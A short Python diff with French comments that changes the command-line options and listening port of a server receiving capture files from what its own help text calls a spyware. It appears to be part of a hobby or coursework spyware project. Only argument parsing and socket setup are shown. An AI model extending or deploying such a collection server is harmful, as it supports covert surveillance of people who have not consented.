@@ -11,7 +11,7 @@ parser.add_argument("-k", "--kill", help="Pour arrêter la capture et supprimer 
 # Créer l'option -s pour lister tous les fichiers de captures reçu par le spyware
 parser.add_argument("-s", "--show", help="Pour lister tous les fichiers de captures reçu par le spyware, ajoutez l'option -s ou --show", action="store_true")
 # Créer l'option -l pour écouter sur un port TCP spécifique
-parser.add_argument("-l <port>", "--listen <port>", help="Pour écouter sur un port TCP spécifique, ajoutez l'option -l ou --listen suivi du port TCP", type=int)
+parser.add_argument("-l", "--listen", help="Pour écouter sur un port TCP spécifique, ajoutez l'option -l ou --listen suivi du port TCP", type=int)
 # Créer l'option -r pour afficher le contenu stocké dans un fichier de capture
 parser.add_argument("-r", "--readfile", help="Pour afficher le contenu stocké dans un fichier de capture, ajoutez l'option -r ou --readfile suivi du nom du fichier", type=str)
 #----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -22,7 +22,11 @@ parser.add_argument("-r", "--readfile", help="Pour afficher le contenu stocké d
 server_functions.dossier_resultats()
 
 # Paramètres du serveur
-server_address = ("192.168.1.66", 8080)
+if parser.parse_args().listen:
+    server_port = parser.parse_args().listen
+else:
+    server_port = 8080
+server_address = ("192.168.1.66", server_port)
 
 # Création du socket
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
